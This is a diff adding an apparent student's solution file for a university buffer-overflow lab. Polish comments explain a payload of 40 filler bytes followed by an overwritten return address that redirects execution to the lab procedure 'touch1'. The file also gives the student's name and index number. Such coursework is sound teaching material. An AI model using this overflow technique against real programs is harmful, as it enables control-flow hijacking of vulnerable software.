@@ -1,0 +1,18 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+
+ 40 bajtów - rozmiar bufora, dowolne dane
+ 0x401b2d - adres procedury touch1
+ */
+
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+2d 1b 40 00 00 00 00 00
